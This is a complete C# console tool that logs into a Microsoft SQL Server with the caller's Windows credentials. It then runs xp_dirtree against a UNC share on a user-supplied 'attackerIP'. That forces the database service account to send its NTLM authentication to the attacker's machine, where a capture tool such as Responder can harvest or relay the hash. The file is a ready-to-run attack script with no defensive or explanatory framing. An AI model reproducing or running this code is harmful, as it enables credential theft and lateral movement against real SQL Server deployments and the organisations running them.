using System;
using System.Data.SqlClient;

namespace SQL
{
    class Program
    {
        static void Main(string[] args)
        {
          if (args.Length == 3)
           {
            String sqlServer = args[0];
            String database =  args[1];

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);
           
            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            String query = "EXEC master..xp_dirtree \"\\\\ "+ args[2] + "\\test\";";
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();
            
            con.Close();
            }
          else {
            Console.WriteLine("Usage: mssql-responder-connect.exe sqlserver database attackerIP");
          }  
        }
    }
}
